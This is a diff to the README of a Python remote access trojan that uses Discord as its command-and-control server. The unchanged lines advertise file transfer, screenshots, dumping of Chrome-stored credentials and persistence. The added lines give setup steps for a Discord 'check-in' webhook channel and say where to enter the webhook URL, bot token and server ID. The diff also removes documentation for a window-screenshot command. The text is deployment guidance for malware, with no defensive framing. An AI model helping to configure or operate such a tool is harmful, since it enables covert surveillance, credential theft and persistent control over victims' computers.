@@ -7,20 +7,22 @@ A simple RAT written in Python that uses Discord as it's C2 server.
 - Download files  
 - Upload files  
 - Screenshot    
-- Screenshot all open windows  
 - Dump credentials stored in Chrome  
 - Persistence  
 - And more...
 
 
 # Usage  
+**In your server you MUST create a text channel named 'check-in'  
+and create a webhook that posts in the 'check-in' channel**
+
 **You have to enter your Discord servers:**  
 * Webhook URL
 * Bot Token  
 * ServerID  
 * executable filename
 
-**Into the script around line 20.**
+**Into the script around line 32.**
 
 **If you want an EXE use PyInstaller with harmony.py**  
 ___
@@ -101,19 +103,6 @@ screenshot
 # or
 
 ss
-```
-
----
-**focusScreenshot**  
-Attempts to take a screenshot of all open windows.  
-
-EX:
-```
-focusScreenshot
-
-# or
-
-fss
 ```
 
 ---
